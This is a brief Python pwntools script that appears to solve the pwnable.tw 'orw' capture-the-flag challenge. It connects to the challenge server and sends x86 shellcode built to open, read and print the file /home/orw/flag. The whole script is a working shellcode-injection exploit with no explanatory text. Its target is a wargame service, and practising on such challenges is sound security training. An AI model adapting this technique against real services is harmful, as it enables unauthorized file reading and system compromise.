#!/usr/bin/python3

from pwn import *

#p = process("./orw")
p = remote("chall.pwnable.tw", 10001)

context.arch = 'x86'

shellcode = shellcraft.pushstr('/home/orw/flag')
shellcode += shellcraft.open('esp', 0, 0)
shellcode += shellcraft.read('eax', 'esp', 0x30)
shellcode += shellcraft.write(1, 'esp', 0x30)

p.sendlineafter(":", asm(shellcode))

p.interactive()

